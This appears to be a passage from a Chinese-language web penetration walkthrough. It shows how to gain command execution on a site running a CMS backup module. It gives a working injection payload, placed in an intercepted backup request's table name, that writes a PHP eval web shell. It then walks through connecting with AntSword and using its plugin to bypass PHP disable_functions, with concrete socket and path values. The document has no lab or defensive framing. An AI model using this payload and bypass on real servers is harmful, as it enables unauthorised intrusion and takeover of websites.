修改存放目录

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/3e46f062ca9b.webp)

开始备份时进行拦截抓包

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/985cf124708f.png)

修改最后的表名为payload

0]=1;#";@file_put_contents('shell.php','<?php eval($_POST["x"]);?>');#

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/e5c738c9a307.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/9b4ff0f17afa.webp)

之后一定要先访问config.php，执行代码生成shell.php

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/1166c11fa77c.webp)

之后再访问shell.php查看是否生成成功，最后用蚁剑进行连接

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/fe1f6c04f150.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/0cac3cda8d55.png)

## PHP函数禁用绕过方法

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/867279afc292.png)

连接蚁剑之后，我们会发现他无法执行终端命令，其实是因为这个网站使用了diable function

禁用了system函数

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/61655b9ed095.webp)

我们就要用到

## 蚁剑的Bypass Disable Functions 插件

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/0cd33e73d9fd.webp)

右键连接的shell加载插件

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/18972935a2d4.webp)

根据server api选择模式

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/dedc3ab0e1fa.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/bb13b8813bf7.png)

fcgi地址

/tmp/php-cgi-56.sock

php路径

/www/server/php/56/bin/php

#启动web服务路径，和shell路径一致

/www/wwwroot/web/system/ebak/bdata/tjh

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/bf0a007e260b.webp)

生成 .antproxy.php 代理脚本

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/d4f9a87b137e.webp)

连接 .antproxy.php 脚本

直接修改shell链接，密码不变。**需要在几分钟内连接这个shell，因为蚁剑的插件的bypass方法**

**是重新启动一个不使用自带的php.ini的php服务，可能随时会掉，所以要尽快连接。**

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/7f985bfafc58.png)

连接之后就能使用被禁用的命令
